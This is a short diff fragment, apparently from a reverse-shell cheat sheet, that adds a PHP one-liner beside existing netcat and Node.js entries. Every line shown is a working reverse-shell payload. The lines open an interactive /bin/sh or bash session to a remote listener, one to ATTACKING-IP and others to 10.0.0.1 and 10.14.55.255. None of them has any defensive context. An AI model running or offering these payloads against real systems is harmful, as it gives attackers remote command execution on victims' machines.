@@ -36,3 +36,6 @@ nc -e /bin/sh ATTACKING-IP 80
 
 
 require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
+
+##################################### PHP
+php -r '$sock=fsockopen("10.14.55.255",666);exec("/bin/sh -i <&3 >&3 2>&3");'
